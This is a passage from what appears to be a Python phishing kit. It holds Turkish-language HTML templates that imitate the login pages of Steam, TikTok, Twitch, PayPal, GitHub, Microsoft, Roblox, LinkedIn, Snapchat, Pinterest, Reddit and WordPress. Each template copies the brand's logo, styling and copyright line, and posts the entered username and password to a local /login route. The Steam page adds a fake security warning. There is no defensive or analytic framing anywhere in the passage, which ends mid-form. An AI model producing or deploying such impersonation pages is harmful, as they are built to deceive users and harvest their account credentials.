.warning{background:#4c1f1f;border-left:3px solid #f44336;padding:12px;border-radius:3px;color:#ffcccc;font-size:12px;margin-top:20px}
.warning b{color:#ff6b6b}
.footer{position:fixed;bottom:20px;left:0;right:0;text-align:center;color:#56707f;font-size:11px}
</style></head>
<body>
<div class="topbar">
<svg class="steam-logo" viewBox="0 0 24 24" fill="#c7d5e0"><path d="M12 0C5.4 0 0 5.4 0 12c0 5.1 3.2 9.5 7.6 11.3l2.8-4c-.5-.2-.9-.5-1.3-.9-.7-.7-1.1-1.7-1.1-2.7 0-2.2 1.8-4 4-4 .5 0 1 .1 1.4.3L17 4.4C15.4 3.5 13.8 3 12 3c-.2 0-.4 0-.5 0L12 0zm0 18c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2z"/></svg>
<span class="brand">STEAM</span>
</div>
<div class="card">
<div class="title">Giriş Yap</div>
<div class="subtitle">Steam hesabınızla oturum açın</div>
<form method="POST" action="/login/steam">
<input class="field" type="text" name="username" placeholder="Steam hesap adı" required autofocus>
<input class="field" type="password" name="password" placeholder="Şifre" required>
<label class="checkbox"><input type="checkbox" checked> Beni hatırla</label>
<button class="btn" type="submit">Giriş</button>
</form>
<a class="link" href="#">Şifremi unuttum</a>
<a class="link" href="#">Yeni hesap oluştur</a>
<div class="warning"><b>⚠ Steam Guard</b><br>Bu cihaz tanınmadı. Giriş yaptıktan sonra e-posta doğrulaması istenecektir.</div>
</div>
<div class="footer">© 2024 Valve Corporation. Tüm hakları saklıdır.</div>
</body></html>"""

TIKTOK_HTML = """<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>TikTok - Giriş Yap</title>
<style>""" + BASE_STYLE + """
body{background:#000;flex-direction:column;color:#fff}
.card{width:100%;max-width:400px;padding:32px}
.logo-wrap{text-align:center;margin-bottom:24px}
.title{font-size:32px;font-weight:700;text-align:center;margin-bottom:32px;color:#fff}
.tabs{display:flex;border-bottom:1px solid #2f2f2f;margin-bottom:24px}
.tab{flex:1;padding:14px;text-align:center;color:#8a8b91;font-size:15px;font-weight:600;cursor:pointer;border-bottom:2px solid transparent;margin-bottom:-1px}
.tab.active{color:#fff;border-bottom-color:#fe2c55}
.field{width:100%;padding:14px;margin-bottom:12px;border:none;border-radius:4px;background:#1f1f1f;color:#fff;font-size:15px;outline:none}
.field:focus{background:#2a2a2a}
.btn{width:100%;padding:14px;background:#fe2c55;color:#fff;border:none;border-radius:4px;font-size:16px;font-weight:700;margin-top:8px}
.forgot{color:#a1a1a6;font-size:13px;display:block;margin-top:16px}
.divider{display:flex;align-items:center;gap:10px;margin:20px 0;color:#8a8b91;font-size:12px}
.divider::before,.divider::after{content:'';flex:1;height:1px;background:#2f2f2f}
.social{display:flex;align-items:center;justify-content:center;gap:8px;width:100%;padding:12px;background:transparent;color:#fff;border:1px solid #2f2f2f;border-radius:4px;font-size:14px;font-weight:600;margin-bottom:10px}
.footer{text-align:center;color:#8a8b91;font-size:13px;margin-top:32px}
.footer a{color:#fe2c55;font-weight:600}
.legal{font-size:11px;color:#5c5c5f;text-align:center;margin-top:16px;line-height:1.5}
</style></head>
<body>
<div class="logo-wrap">
<svg width="44" height="44" viewBox="0 0 48 48"><path fill="#25F4EE" d="M37.5 6.2c-2.3-2.9-3.4-5.1-3.4-8.2H28c0 .5 0 2.7.2 3.4 0 5 2.5 9.3 6.7 11.9-1.9-.2-4-1-5.7-2.1v15c0 7.5-4.4 14.1-13 14.1-3.4 0-6.4-1.2-8.8-3.2 2.5 2.1 5.6 3.2 9 3.2 8.5 0 13-6.6 13-14.1V12c2.1 1.6 4.7 2.6 7.5 2.6h1.5c-.2-.5-.4-1-.5-1.5 0-2.2-.4-4.3-.4-6.9z"/><path fill="#FE2C55" d="M44.8 12.1v3.4c-1.5 0-2.9-.2-4.3-.6-1.9-.6-3.7-1.6-5.2-2.9v13.4c0 7.5-4.4 14.1-13 14.1-3.4 0-6.4-1.2-8.8-3.2 2.5 2.1 5.6 3.2 9 3.2 8.5 0 13-6.6 13-14.1V11.9c1.9 1.8 4.5 2.9 7.3 2.9.3 0 .7 0 1-.1v-2.6h-.1c-.3 0-.6.1-.9.1z"/><path fill="#FFF" d="M28.2 15.1v-3.4h-7.6v22c0 2.9-1.5 5.4-3.9 6.5-.9.5-2 .7-3.1.7-3.2 0-5.9-2.4-6.3-5.5-.5 3.9 2.4 7.4 6.7 7.8 3.4.3 6.4-1.2 8.2-3.7 1.4-1.9 2.2-4.2 2.2-6.7V15.1h3.8z"/></svg>
</div>
<div class="title">Giriş yap</div>
<div class="tabs"><div class="tab active">Telefon</div><div class="tab">E-posta</div><div class="tab">Kullanıcı adı</div></div>
<form method="POST" action="/login/tiktok">
<input class="field" type="text" name="username" placeholder="Telefon numarası veya kullanıcı adı" required autofocus>
<input class="field" type="password" name="password" placeholder="Şifre" required>
<a class="forgot" href="#">Şifreni mi unuttun?</a>
<button class="btn" type="submit">Giriş yap</button>
</form>
<div class="divider">veya</div>
<button class="social">📘 Facebook ile devam et</button>
<button class="social">🔵 Google ile devam et</button>
<button class="social">🍎 Apple ile devam et</button>
<div class="footer">Hesabın yok mu? <a href="#">Kaydol</a></div>
<div class="legal">Devam ederek TikTok Hizmet Şartları'nı ve Gizlilik Politikası'nı kabul etmiş olursunuz.</div>
</div>
</body></html>"""

TWITCH_HTML = """<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Twitch</title>
<style>""" + BASE_STYLE + """
body{background:#0e0e10;flex-direction:column;color:#efeff1}
.card{background:#18181b;border-radius:6px;padding:32px;width:100%;max-width:400px;box-shadow:0 4px 20px rgba(0,0,0,.5)}
.logo-wrap{text-align:center;margin-bottom:24px}
.title{font-size:24px;font-weight:600;text-align:center;margin-bottom:24px}
.label{font-size:13px;color:#efeff1;margin-bottom:6px;display:block;font-weight:600}
.field{width:100%;padding:10px;margin-bottom:16px;border:1px solid #3a3a3d;border-radius:4px;background:#18181b;color:#efeff1;font-size:14px;outline:none}
.field:focus{border-color:#9147ff}
.forgot{font-size:12px;color:#bf94ff;display:block;margin-bottom:16px}
.btn{width:100%;padding:12px;background:#9147ff;color:#fff;border:none;border-radius:4px;font-size:14px;font-weight:600}
.divider{display:flex;align-items:center;gap:10px;margin:20px 0;color:#adadb8;font-size:12px}
.divider::before,.divider::after{content:'';flex:1;height:1px;background:#3a3a3d}
.social{width:100%;padding:10px;background:transparent;color:#efeff1;border:1px solid #3a3a3d;border-radius:4px;font-size:14px;font-weight:600;margin-bottom:8px;display:flex;align-items:center;justify-content:center;gap:8px}
.signup{font-size:13px;color:#adadb8;margin-top:20px;text-align:center}
.signup a{color:#bf94ff}
</style></head>
<body>
<div class="card">
<div class="logo-wrap">
<svg width="60" height="60" viewBox="0 0 2400 2800" fill="#9147ff"><path d="M2200 1300l-400 400h-400l-350 350v-350H600V200h1600zM500 0L0 500v1800h600v500l500-500h400l900-900V0H500zm1300 1300V500h-200v800h200zm-550 0V500H1050v800h200z"/></svg>
</div>
<div class="title">Twitch'e giriş yap</div>
<form method="POST" action="/login/twitch">
<label class="label">Kullanıcı adı</label>
<input class="field" type="text" name="username" required autofocus>
<label class="label">Şifre</label>
<input class="field" type="password" name="password" required>
<a class="forgot" href="#">Şifreni mi unuttun?</a>
<button class="btn" type="submit">Giriş yap</button>
</form>
<div class="divider">veya</div>
<button class="social">🔵 Google ile giriş yap</button>
<button class="social">🍎 Apple ile giriş yap</button>
<button class="social">📘 Facebook ile giriş yap</button>
<div class="signup">Hesabın yok mu? <a href="#">Kayıt ol</a></div>
</div>
</body></html>"""

PAYPAL_HTML = """<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>PayPal - Giriş Yap</title>
<style>""" + BASE_STYLE + """
body{background:#f5f7fa;flex-direction:column}
.card{background:#fff;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,.1);padding:40px;width:100%;max-width:450px}
.logo{text-align:center;margin-bottom:32px}
.title{font-size:24px;font-weight:600;color:#001435;text-align:center;margin-bottom:8px}
.subtitle{font-size:14px;color:#6c7378;text-align:center;margin-bottom:32px}
.field{width:100%;padding:14px;margin-bottom:16px;border:1px solid #9da3a6;border-radius:4px;font-size:16px;outline:none}
.field:focus{border-color:#0070ba}
.forgot{color:#0070ba;font-size:14px;display:block;margin-bottom:20px}
.btn{width:100%;padding:14px;background:#0070ba;color:#fff;border:none;border-radius:100px;font-size:16px;font-weight:600}
.divider{text-align:center;color:#6c7378;font-size:13px;margin:20px 0;position:relative}
.divider::before{content:'';position:absolute;top:50%;left:0;right:0;height:1px;background:#e1e5e8;z-index:0}
.divider span{background:#fff;padding:0 12px;position:relative;z-index:1}
.signup-btn{width:100%;padding:14px;background:#fff;color:#0070ba;border:1px solid #0070ba;border-radius:100px;font-size:16px;font-weight:600}
.footer{text-align:center;margin-top:24px;font-size:12px;color:#6c7378}
.footer a{color:#0070ba}
.security{display:flex;justify-content:center;gap:20px;margin-top:20px;font-size:11px;color:#6c7378}
</style></head>
<body>
<div class="card">
<div class="logo">
<svg width="140" height="40" viewBox="0 0 140 40"><text x="0" y="30" font-family="Arial,sans-serif" font-size="32" font-weight="700" fill="#003087">Pay</text><text x="62" y="30" font-family="Arial,sans-serif" font-size="32" font-weight="700" fill="#009cde">Pal</text></svg>
</div>
<div class="title">Oturum açın</div>
<div class="subtitle">PayPal hesabınıza hoş geldiniz</div>
<form method="POST" action="/login/paypal">
<input class="field" type="text" name="username" placeholder="E-posta veya telefon numarası" required autofocus>
<input class="field" type="password" name="password" placeholder="Şifre" required>
<a class="forgot" href="#">Şifrenizi mi unuttunuz?</a>
<button class="btn" type="submit">Oturum aç</button>
</form>
<div class="divider"><span>veya</span></div>
<button class="signup-btn">Yeni hesap oluştur</button>
<div class="security"><div>🔒 SSL ile korunuyor</div><div>🛡 256-bit şifreleme</div></div>
<div class="footer">© 2024 PayPal. Tüm hakları saklıdır. · <a href="#">Gizlilik</a> · <a href="#">Şartlar</a></div>
</div>
</body></html>"""

GITHUB_HTML = """<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>GitHub'a Giriş Yap</title>
<style>""" + BASE_STYLE + """
body{background:#0d1117;flex-direction:column;color:#e6edf3}
.logo-wrap{margin-bottom:24px}
.card{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:24px;width:100%;max-width:340px}
.title{font-size:24px;font-weight:300;text-align:center;margin-bottom:20px;letter-spacing:-.5px}
.label{font-size:14px;font-weight:600;display:block;margin-bottom:6px}
.label .req{color:#f85149}
.field{width:100%;padding:8px 12px;margin-bottom:16px;border:1px solid #30363d;border-radius:6px;background:#0d1117;color:#e6edf3;font-size:14px;outline:none}
.field:focus{border-color:#58a6ff}
.forgot{font-size:12px;color:#58a6ff;float:right;margin-top:-10px;margin-bottom:16px}
.btn{width:100%;padding:8px 16px;background:#238636;color:#fff;border:none;border-radius:6px;font-size:14px;font-weight:600}
.passkey{display:flex;align-items:center;justify-content:center;gap:8px;width:100%;padding:8px;background:transparent;color:#e6edf3;border:1px solid #30363d;border-radius:6px;font-size:14px;margin-top:12px;font-weight:600}
.card-alt{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:16px;width:100%;max-width:340px;text-align:center;font-size:14px;margin-top:16px}
.card-alt a{color:#58a6ff}
.footer{position:fixed;bottom:16px;left:0;right:0;text-align:center;font-size:12px;color:#7d8590}
.footer a{color:#58a6ff;margin:0 8px}
</style></head>
<body>
<div class="logo-wrap">
<svg height="48" viewBox="0 0 16 16" fill="#e6edf3"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.01 8.01 0 0 0 16 8c0-4.42-3.58-8-8-8z"/></svg>
</div>
<div class="card">
<div class="title">GitHub'a giriş yap</div>
<form method="POST" action="/login/github">
<label class="label">Kullanıcı adı veya e-posta adresi<span class="req">*</span></label>
<input class="field" type="text" name="username" required autofocus>
<label class="label">Şifre<span class="req">*</span></label>
<input class="field" type="password" name="password" required>
<a class="forgot" href="#">Şifreni mi unuttun?</a>
<button class="btn" type="submit">Giriş yap</button>
<button class="passkey" type="button">🔑 Passkey ile giriş yap</button>
</form>
</div>
<div class="card-alt">GitHub'da yeni misin? <a href="#">Hesap oluştur</a></div>
<div class="footer"><a href="#">Şartlar</a><a href="#">Gizlilik</a><a href="#">Güvenlik</a><a href="#">İletişim</a></div>
</body></html>"""

MS_HTML = """<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Microsoft Hesabınızda oturum açın</title>
<style>""" + BASE_STYLE + """
body{background:#f2f2f2;flex-direction:column;gap:20px}
.card{background:#fff;box-shadow:0 2px 6px rgba(0,0,0,.2);padding:44px;width:100%;max-width:440px}
.ms-logo{display:flex;gap:2px;margin-bottom:20px}
.ms-logo div{width:20px;height:20px}
.title{font-size:24px;font-weight:600;color:#1b1b1b;margin-bottom:24px}
.field{width:100%;padding:6px 10px;border:none;border-bottom:1px solid #605e5c;font-size:15px;outline:none;margin-bottom:24px;background:transparent}
.field:focus{border-bottom-color:#0067b8;border-bottom-width:2px}
.link{color:#0067b8;font-size:13px;display:block;margin-bottom:16px}
.btn{background:#0067b8;color:#fff;border:none;padding:8px 32px;font-size:15px;font-weight:600;border-radius:2px;float:right;margin-top:8px}
.clearfix::after{content:'';display:table;clear:both}
.footer{position:fixed;bottom:20px;right:20px;font-size:12px;color:#605e5c}
.footer a{color:#605e5c;margin-left:16px}
</style></head>
<body>
<div class="card">
<div class="ms-logo"><div style="background:#f25022"></div><div style="background:#7fba00"></div><div style="background:#00a4ef"></div><div style="background:#ffb900"></div></div>
<div class="title">Oturum açın</div>
<form method="POST" action="/login/microsoft" class="clearfix">
<input class="field" type="text" name="username" placeholder="E-posta, telefon veya Skype" required autofocus>
<input class="field" type="password" name="password" placeholder="Parola" required>
<a class="link" href="#">Parolanızı mı unuttunuz?</a>
<button class="btn" type="submit">İleri</button>
</form>
</div>
<div class="footer"><a href="#">Giriş seçenekleri</a><a href="#">Hesap oluştur</a></div>
</body></html>"""

ROBLOX_HTML = """<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Roblox - Giriş Yap</title>
<style>""" + BASE_STYLE + """
body{background:linear-gradient(135deg,#1b1b2f 0%,#2a1a3e 100%);flex-direction:column;color:#fff}
.card{background:#232527;border-radius:8px;padding:32px;width:100%;max-width:400px;box-shadow:0 4px 24px rgba(0,0,0,.5)}
.logo-wrap{text-align:center;margin-bottom:16px}
.logo-text{font-size:32px;font-weight:900;letter-spacing:-1px;color:#fff}
.title{font-size:20px;font-weight:600;text-align:center;margin-bottom:24px}
.field{width:100%;padding:12px 14px;margin-bottom:12px;border:1px solid #3a3a3a;border-radius:6px;background:#2a2c2f;color:#fff;font-size:15px;outline:none}
.field:focus{border-color:#ff4747}
.btn{width:100%;padding:12px;background:#ff4747;color:#fff;border:none;border-radius:6px;font-size:15px;font-weight:600;margin-top:8px}
.forgot{color:#ff8a8a;font-size:13px;display:block;margin-top:14px;text-align:center}
.divider{display:flex;align-items:center;gap:10px;margin:20px 0;color:#8a8a8a;font-size:12px}
.divider::before,.divider::after{content:'';flex:1;height:1px;background:#3a3a3a}
.social{display:flex;align-items:center;justify-content:center;gap:8px;width:100%;padding:10px;background:#2a2c2f;color:#fff;border:1px solid #3a3a3a;border-radius:6px;font-size:14px;margin-bottom:8px}
.signup{text-align:center;font-size:14px;color:#8a8a8a;margin-top:20px}
.signup a{color:#ff8a8a;font-weight:600}
</style></head>
<body>
<div class="card">
<div class="logo-wrap">
<svg width="48" height="48" viewBox="0 0 48 48"><rect width="48" height="48" rx="8" fill="#232527"/><path d="M12 12h24v24H12z" fill="#232527" stroke="#fff" stroke-width="2" transform="rotate(8 24 24)"/><text x="24" y="30" text-anchor="middle" font-family="Arial" font-size="14" font-weight="900" fill="#ff4747">R</text></svg>
<div class="logo-text" style="margin-top:8px">ROBLOX</div>
</div>
<div class="title">Hoş geldin! Lütfen giriş yap</div>
<form method="POST" action="/login/roblox">
<input class="field" type="text" name="username" placeholder="Kullanıcı adı" required autofocus>
<input class="field" type="password" name="password" placeholder="Şifre" required>
<button class="btn" type="submit">Giriş Yap</button>
</form>
<a class="forgot" href="#">Şifreni mi unuttun?</a>
<div class="divider">veya</div>
<button class="social">🎮 Roblox ile devam et</button>
<div class="signup">Roblox'ta yeni misin? <a href="#">Hesap oluştur</a></div>
</div>
</body></html>"""

LINKEDIN_HTML = """<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>LinkedIn'e Giriş Yap</title>
<style>""" + BASE_STYLE + """
body{background:#f3f2ef;flex-direction:column}
.card{background:#fff;border-radius:8px;padding:40px;width:100%;max-width:400px;box-shadow:0 4px 12px rgba(0,0,0,.15)}
.logo-wrap{margin-bottom:24px}
.title{font-size:32px;font-weight:600;color:#000000e6;margin-bottom:8px}
.subtitle{font-size:14px;color:#00000099;margin-bottom:28px}
.field{width:100%;padding:14px;margin-bottom:12px;border:1px solid #00000066;border-radius:4px;font-size:16px;outline:none}
.field:focus{border-color:#0a66c2}
.forgot{font-size:14px;color:#0a66c2;font-weight:600;display:block;margin-bottom:20px}
.btn{width:100%;padding:14px;background:#0a66c2;color:#fff;border:none;border-radius:9999px;font-size:16px;font-weight:600}
.divider{display:flex;align-items:center;gap:10px;margin:20px 0;color:#00000099;font-size:14px}
.divider::before,.divider::after{content:'';flex:1;height:1px;background:#0000001f}
.social{display:flex;align-items:center;justify-content:center;gap:8px;width:100%;padding:12px;background:transparent;color:#000000e6;border:1px solid #00000066;border-radius:9999px;font-size:14px;font-weight:600;margin-bottom:8px}
.signup{font-size:14px;color:#000000e6;text-align:center;margin-top:24px}
.signup a{color:#0a66c2;font-weight:600}
.footer{position:fixed;bottom:16px;left:0;right:0;text-align:center;font-size:12px;color:#00000099}
.footer a{margin:0 8px;color:#00000099}
</style></head>
<body>
<div class="card">
<div class="logo-wrap">
<svg width="84" height="21" viewBox="0 0 84 21"><text x="0" y="17" font-family="Arial,sans-serif" font-size="20" font-weight="700" fill="#0a66c2">Linked</text><rect x="55" y="0" width="21" height="21" rx="2" fill="#0a66c2"/><text x="65.5" y="16" text-anchor="middle" font-family="Arial" font-size="14" font-weight="700" fill="#fff">in</text></svg>
</div>
<div class="title">Oturum açın</div>
<div class="subtitle">LinkedIn'e hoş geldiniz</div>
<form method="POST" action="/login/linkedin">
<input class="field" type="text" name="username" placeholder="E-posta veya telefon" required autofocus>
<input class="field" type="password" name="password" placeholder="Şifre" required>
<a class="forgot" href="#">Şifrenizi mi unuttunuz?</a>
<button class="btn" type="submit">Oturum aç</button>
</form>
<div class="divider">veya</div>
<button class="social">🔵 Google ile devam et</button>
<button class="social">🍎 Apple ile devam et</button>
<div class="signup">LinkedIn'de yeni misiniz? <a href="#">Hesap oluştur</a></div>
</div>
<div class="footer"><a href="#">Kullanıcı Sözleşmesi</a><a href="#">Gizlilik Politikası</a><a href="#">Topluluk</a><a href="#">Çerez Politikası</a></div>
</body></html>"""

SNAPCHAT_HTML = """<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Snapchat'e Giriş Yap</title>
<style>""" + BASE_STYLE + """
body{background:#fffc00;flex-direction:column}
.card{background:#fff;border-radius:24px;padding:40px 32px;width:100%;max-width:400px;box-shadow:0 8px 32px rgba(0,0,0,.15)}
.logo-wrap{text-align:center;margin-bottom:20px}
.title{font-size:26px;font-weight:800;text-align:center;margin-bottom:8px;color:#000}
.subtitle{font-size:14px;color:#666;text-align:center;margin-bottom:28px}
.field{width:100%;padding:14px;margin-bottom:14px;border:2px solid #e0e0e0;border-radius:8px;font-size:15px;outline:none}
.field:focus{border-color:#000}
.btn{width:100%;padding:14px;background:#000;color:#fff;border:none;border-radius:100px;font-size:15px;font-weight:700;margin-top:4px}
.forgot{color:#000;font-size:13px;display:block;margin-top:16px;text-align:center;font-weight:600}
.signup{text-align:center;font-size:14px;color:#000;margin-top:24px;font-weight:600}
.signup a{color:#000;text-decoration:underline}
</style></head>
<body>
<div class="card">
<div class="logo-wrap">
<svg width="64" height="64" viewBox="0 0 64 64"><path fill="#000" d="M32 4c-6 0-11 5-11 11v3c-1 0-2 1-2 2 0 1 1 2 2 2v3c-1 4-3 7-5 9-2 3-3 5-3 7 0 1 0 2 1 2 1 1 3 1 5 1 1 0 2 0 3-1 1 3 3 5 5 6v3c0 2 2 3 5 3s5-1 5-3v-3c2-1 4-3 5-6 1 1 2 1 3 1 2 0 4 0 5-1 1 0 1-1 1-2 0-2-1-4-3-7-2-2-4-5-5-9v-3c1 0 2-1 2-2 0-1-1-2-2-2v-3c0-6-5-11-11-11z"/></svg>
</div>
<div class="title">Snapchat'e Hoş Geldin</div>
<div class="subtitle">Devam etmek için giriş yap</div>
<form method="POST" action="/login/snapchat">
<input class="field" type="text" name="username" placeholder="Kullanıcı adı veya e-posta" required autofocus>
<input class="field" type="password" name="password" placeholder="Şifre" required>
<a class="forgot" href="#">Şifreni mi unuttun?</a>
<button class="btn" type="submit">Giriş Yap</button>
</form>
<div class="signup">Hesabın yok mu? <a href="#">Kaydol</a></div>
</div>
</body></html>"""

PINTEREST_HTML = """<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Pinterest - Giriş Yap</title>
<style>""" + BASE_STYLE + """
body{background:#fff;flex-direction:column}
.card{background:#fff;border-radius:32px;padding:40px;width:100%;max-width:400px;box-shadow:0 1px 20px rgba(0,0,0,.1)}
.logo-wrap{text-align:center;margin-bottom:16px}
.title{font-size:32px;font-weight:600;text-align:center;margin-bottom:8px;color:#111}
.subtitle{font-size:14px;color:#5f5f5f;text-align:center;margin-bottom:24px}
.field{width:100%;padding:14px;margin-bottom:10px;border:2px solid #ddd;border-radius:16px;font-size:16px;outline:none}
.field:focus{border-color:#e60023}
.forgot{font-size:14px;color:#111;font-weight:600;display:block;margin-bottom:14px}
.btn{width:100%;padding:14px;background:#e60023;color:#fff;border:none;border-radius:24px;font-size:16px;font-weight:600}
.divider{display:flex;align-items:center;gap:10px;margin:20px 0;color:#767676;font-size:13px}
.divider::before,.divider::after{content:'';flex:1;height:1px;background:#efefef}
.social{width:100%;padding:12px;background:#fff;color:#111;border:1px solid #ddd;border-radius:24px;font-size:14px;font-weight:600;margin-bottom:8px;display:flex;align-items:center;justify-content:center;gap:8px}
.signup{text-align:center;font-size:14px;color:#111;font-weight:600;margin-top:20px}
.signup a{color:#e60023}
</style></head>
<body>
<div class="card">
<div class="logo-wrap">
<svg width="48" height="48" viewBox="0 0 24 24" fill="#e60023"><path d="M12 0C5.4 0 0 5.4 0 12c0 5.1 3.2 9.5 7.6 11.2-.1-.9-.2-2.4 0-3.4.2-.9 1.4-5.9 1.4-5.9s-.4-.7-.4-1.8c0-1.7 1-3 2.2-3 1 0 1.5.8 1.5 1.7 0 1-.7 2.6-1 4-.3 1.2.6 2.2 1.8 2.2 2.2 0 3.8-2.3 3.8-5.6 0-2.9-2.1-5-5.1-5-3.5 0-5.5 2.6-5.5 5.3 0 1.1.4 2.2 1 2.9.1.1.1.2.1.3-.1.4-.3 1.3-.4 1.5-.1.2-.2.3-.5.2-1.4-.6-2.2-2.6-2.2-4.2 0-3.4 2.5-6.5 7.1-6.5 3.7 0 6.6 2.7 6.6 6.2 0 3.7-2.3 6.7-5.6 6.7-1.1 0-2.1-.6-2.5-1.2l-.7 2.6c-.2.9-.9 2.1-1.4 2.8 1 .3 2.1.5 3.2.5 6.6 0 12-5.4 12-12S18.6 0 12 0z"/></svg>
</div>
<div class="title">Pinterest'e Hoş Geldiniz</div>
<div class="subtitle">İlham veren fikirleri keşfedin</div>
<form method="POST" action="/login/pinterest">
<input class="field" type="text" name="username" placeholder="E-posta" required autofocus>
<input class="field" type="password" name="password" placeholder="Şifre" required>
<a class="forgot" href="#">Şifrenizi mi unuttunuz?</a>
<button class="btn" type="submit">Giriş Yap</button>
</form>
<div class="divider">VEYA</div>
<button class="social">🔵 Google ile devam et</button>
<button class="social">📘 Facebook ile devam et</button>
<div class="signup">Hesabınız yok mu? <a href="#">Kaydolun</a></div>
</div>
</body></html>"""

REDDIT_HTML = """<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Reddit - Giriş Yap</title>
<style>""" + BASE_STYLE + """
body{background:#dae0e6;flex-direction:column}
.card{background:#fff;border-radius:8px;padding:32px;width:100%;max-width:400px;box-shadow:0 2px 10px rgba(0,0,0,.1)}
.logo-wrap{text-align:center;margin-bottom:20px}
.logo-text{font-size:32px;font-weight:800;color:#ff4500;letter-spacing:-1px}
.title{font-size:20px;font-weight:600;text-align:center;margin-bottom:24px;color:#1a1a1b}
.field{width:100%;padding:12px 14px;margin-bottom:10px;border:1px solid #d0d0d0;border-radius:20px;font-size:14px;outline:none;background:#f6f7f8}
.field:focus{border-color:#ff4500;background:#fff}
.btn{width:100%;padding:12px;background:#ff4500;color:#fff;border:none;border-radius:20px;font-size:14px;font-weight:700;margin-top:8px}
.divider{display:flex;align-items:center;gap:10px;margin:20px 0;color:#7c7c7c;font-size:12px}
.divider::before,.divider::after{content:'';flex:1;height:1px;background:#d0d0d0}
.social{display:flex;align-items:center;justify-content:center;gap:8px;width:100%;padding:10px;background:transparent;color:#1a1a1b;border:1px solid #d0d0d0;border-radius:20px;font-size:13px;font-weight:700;margin-bottom:8px}
.signup{text-align:center;font-size:13px;color:#7c7c7c;margin-top:20px}
.signup a{color:#ff4500;font-weight:700}
.footer{text-align:center;font-size:11px;color:#7c7c7c;margin-top:20px}
</style></head>
<body>
<div class="card">
<div class="logo-wrap">
<svg width="36" height="36" viewBox="0 0 20 20" fill="#ff4500"><circle cx="10" cy="10" r="10"/><circle cx="7" cy="9.5" r="1.5" fill="#fff"/><circle cx="13" cy="9.5" r="1.5" fill="#fff"/><path d="M6.5 12.5c1 1 2.2 1.5 3.5 1.5s2.5-.5 3.5-1.5" stroke="#fff" stroke-width="1" fill="none" stroke-linecap="round"/></svg>
<div class="logo-text">reddit</div>
</div>
<div class="title">Giriş yap</div>
<form method="POST" action="/login/reddit">
<input class="field" type="text" name="username" placeholder="Kullanıcı adı" required autofocus>
<input class="field" type="password" name="password" placeholder="Şifre" required>
<button class="btn" type="submit">Giriş yap</button>
</form>
<div class="divider">VEYA</div>
<button class="social">🔵 Google ile devam et</button>
<button class="social">🍎 Apple ile devam et</button>
<div class="signup">Reddit'te yeni misin? <a href="#">Hesap oluştur</a></div>
<div class="footer">Devam ederek Kullanıcı Sözleşmesi ve Gizlilik Politikası'nı kabul etmiş olursun.</div>
</div>
</body></html>"""

WP_HTML = """<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>WordPress › Giriş</title>
<style>""" + BASE_STYLE + """
body{background:#f0f0f1;flex-direction:column}
.logo-wrap{margin-bottom:24px;text-align:center}
.wp-logo{width:84px;height:84px;background:#21759b;border-radius:50%;display:inline-flex;align-items:center;justify-content:center;box-shadow:0 4px 12px rgba(33,117,155,.3)}
.card{background:#fff;border:1px solid #c3c4c7;border-radius:4px;box-shadow:0 1px 3px rgba(0,0,0,.04);padding:26px 24px;width:100%;max-width:360px}
.title{font-size:20px;font-weight:400;color:#1d2327;margin-bottom:20px;text-align:center}
.label{font-size:14px;color:#1d2327;display:block;margin-bottom:6px;font-weight:600}
.field{width:100%;padding:10px 12px;margin-bottom:16px;border:1px solid #8c8f94;border-radius:4px;font-size:14px;outline:none;background:#fff}
.field:focus{border-color:#2271b1}
.checkbox{display:flex;align-items:center;gap:6px;font-size:14px;color:#1d2327;margin-bottom:16px}
.checkbox input{accent-color:#2271b1}
.btn{width:100%;padding:10px;background:#2271b1;color:#fff;border:none;border:1px solid #2271b1;border-radius:4px;font-size:14px;font-weight:600}
.lost{display:block;text-align:center;margin-top:14px;font-size:13px;color:#2271b1}
.back{text-align:center;font-size:13px;color:#50575e;margin-top:20px}
.back a{color:#2271b1}
</style></head>
<body>
<div class="logo-wrap">
<div class="wp-logo"><svg width="52" height="52" viewBox="0 0 24 24" fill="#fff"><path d="M12 0C5.4 0 0 5.4 0 12s5.4 12 12 12 12-5.4 12-12S18.6 0 12 0z"/></svg></div>
</div>
<div class="card">
<div class="title">Giriş Yap</div>
<form method="POST" action="/login/wordpress">
<label class="label">Kullanıcı Adı veya E-posta</label>
<input class="field" type="text" name="username" required autofocus>
<label class="label">Şifre</label>
<input class="field" type="password" name="password" required>
